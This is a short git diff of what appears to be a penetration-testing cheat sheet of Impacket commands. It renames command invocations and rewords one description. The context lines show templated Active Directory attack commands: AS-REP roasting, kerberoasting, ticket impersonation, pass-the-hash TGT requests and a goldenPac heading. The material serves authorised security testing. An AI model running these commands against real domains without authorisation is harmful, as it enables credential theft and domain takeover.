@@ -17,7 +17,7 @@ GetNPUsers.py -dc-ip <dc_ip> <domain>/ -usersfile <users_file> -format hashcat
 ## GetUSERSPN - find Service Principal Names that are associated with a normal user account (kerberoasting)
 #plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
 ```
-GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>
+GetUserSPNs -request -dc-ip <dc_ip> <domain>/<user>:<password>
 ```
 
 ## MS14-068 - goldenPac
@@ -56,8 +56,8 @@ getST.py -spn cifs/<target> <domain>/<netbios_name>\$ -impersonate <user>
 getTGT.py -dc-ip <dc_ip> -hashes <lm_hash>:<nt_hash> <domain>/<user>
 ```
 
-## GetADUser - gather data about the domain’s users and their corresponding email addresses
+## GetADUser - find/enumerate all ldap users
 #plateform/linux #target/remote  #cat/RECON 
 ```
-GetADUsers.py -all <domain>/<user>:<password> -dc-ip <dc_ip>
+GetADUsers -all <domain>/<user>:<password> -dc-ip <dc_ip>
 ```
